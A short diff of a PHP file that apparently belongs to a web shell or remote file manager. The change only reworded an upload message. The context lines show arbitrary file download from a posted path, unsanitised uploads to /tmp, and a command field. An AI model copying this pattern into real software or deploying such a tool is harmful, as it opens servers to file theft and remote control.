@@ -12,7 +12,7 @@ if (($_POST['submit'] == "Download") && file_exists($_POST['dlPath'])) {
 	exit;
 } else if (($_POST['submit'] == "Upload") && is_uploaded_file($_FILES['ulfile']['tmp_name'])) {
 	move_uploaded_file($_FILES['ulfile']['tmp_name'], "/tmp/" . $_FILES['ulfile']['name']);
-	$ulmsg = "Uploaded file " . htmlentities($_FILES['ulfile']['name']) . " to /tmp.";
+	$ulmsg = "Uploaded file to /tmp/" . htmlentities($_FILES['ulfile']['name']);
 	unset($_POST['txtCommand']);
 }
 ?>
